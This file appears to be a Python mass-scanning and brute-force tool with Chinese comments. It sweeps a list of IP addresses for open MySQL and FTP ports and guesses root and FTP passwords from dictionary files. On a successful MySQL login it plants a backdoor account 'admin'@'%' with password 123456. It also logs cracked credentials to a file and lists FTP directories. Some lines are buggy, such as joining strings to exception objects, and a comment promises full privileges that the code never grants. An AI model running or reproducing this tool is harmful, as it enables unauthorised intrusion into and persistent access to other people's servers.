import pymysql
import socket
import time
from datetime import datetime
from multiprocessing.dummy import Pool as ThreadPool

from ftplib import FTP
# 测试目标端口开放情况

save_path = "./result.txt"
ip_list = []
with open('iprange.txt', 'rb') as f:
    for line in f.readlines():
        ip_list.append(line.strip())


def port_scan(ip):
    t1 = datetime.now()
    print("[+] Testing ports of : " + str(ip) + "\n")
    # scan_port(line.strip())
    url1 = ip
    # 测试mysql端口是否开放
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(1)
    try:
        res = sk.connect_ex((ip, 3306))
        if res == 0:
            print("\n[+] " + str(url1) + "\'s Mysql is ok! try to login...\r\n")
            try_login_sqlserver(url1, save_path)

    except Exception as e:
        print("\n[-] " + str(url1) + "\'s Mysql is bad! " + e + "\r\n")
    sk.close()
    # 测试ftp端口是否开放
    sk1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk1.settimeout(1)
    url2 = ip
    # try_login_ftp(url2, save_path)
    try:
        res1 = sk1.connect_ex((ip, 21))
        # print(res1)
        if res1 == 0:
            print("\n[+] " + str(url2) + "\'s ftp service is ok! try to login...\r\n")
            try_login_ftp(url2, save_path)

    except Exception as e:
        print("\n[+] " + str(url2) + "\'s ftp service login failed!" + e + "\r\n")
    sk1.close()
    print(datetime.now() - t1)
    return


# 尝试登陆mysql服务
def try_login_sqlserver(ip, save_path):

    with open('dict.txt', 'r') as f:
        for line in f.readlines():
            print("[+] Testing ip: " + str(ip) + " & testing password：" + line.strip())

            # information_schema 是 Mysql 的默认数据库，我们有权限操作
            # PyMysql.cursors.DictCursor 以字典方式进行连接参数管理
            try:
                connection = pymysql.connect(host=ip,
                                             user='root',
                                             password=line.strip(),
                                             db='information_schema',
                                             charset='utf8mb4',
                                             cursorclass=pymysql.cursors.DictCursor)

                print("\n[+] Testing ip: " + str(ip) + " Login successfully! try to set a backdoor account...\r\n")
                result_list = "\nsql service -- " + str(time.asctime()) + " ip: " + str(ip) + " pwd : " +\
                              str(line.strip())
                save_result(save_path, result_list)
                # 后门账号密码为 admin 123456
                try_set_backdoor(connection)
                connection.close()
            except Exception as e:
                # print "[-] " + str(e.message)
                print("\n[+] Testing ip: " + str(ip) + "  Using weakly password login failed!..." + str(e) + "\r\n")
            pass
    return


def try_set_backdoor (connection):
    try:
        with connection.cursor() as cursor:
            # 创建一个新用户
            sql = "CREATE user 'admin'@'%' identified by '123456';"
            cursor.execute(sql)
            # 将后门用户权限给到最大
            cursor.execute("flush privileges;")
            connection.commit()
            connection.close()

            print("[+] New account set successfully!\r\n")
    except Exception as e:
        # print e
        print("[-] New account set failed! " + str(e) + '\r\n')
    return


def try_login_ftp(ip, save_path):
    # 如果输出 user 和 pwd 为空则说明该 ftp 服务允许匿名访问
    try:
        ftp = FTP()
        ftp.connect(ip)
        with open("ftp_dict.txt", 'r') as f:
            for line in f.readlines():
                # print line.strip()
                user = line.strip().split("|")[0]
                pwd = line.strip().split("|")[1]
                ftp.login(user, pwd)  # 匿名访问
                # 访问成功
                print("[+] " + str(ip) + "s FTP service login successful！username= " + user + "pwd = " + pwd + "\r\n")
                # 将结果写入文件 result.txt
                avleable_list = "\rftp service -- " + str(time.asctime()) + " ip: " + \
                                str(ip) + " username | pwd : " + str(user) + " | " + str(pwd)
                save_result(save_path, avleable_list)
                # 尝试读取目录
                print("\n[+] " + str(ip) + "s ftp 文件目录为：")
                ftp.dir()
                break
    except Exception as e:
        print(e)
        print("\n[+] " + str(ip) + "s ftp service is bad!\r\n")
        pass
    return


def save_result(save_path, result_list):
    s = open(save_path, "a")
    s.write(result_list)
    s.close()
    return


def main():
    t1 = datetime.now()
    # 线程数为20
    pool = ThreadPool(processes=20)
    try:
        pool.map(port_scan, ip_list)
    except Exception as e:
        print(e)
    pool.close()
    pool.join()

    print('Multiprocess Scanning Completed in  ', datetime.now() - t1)
    # port_scan(save_path="./result.txt")
    return


if __name__ == '__main__':
    main()
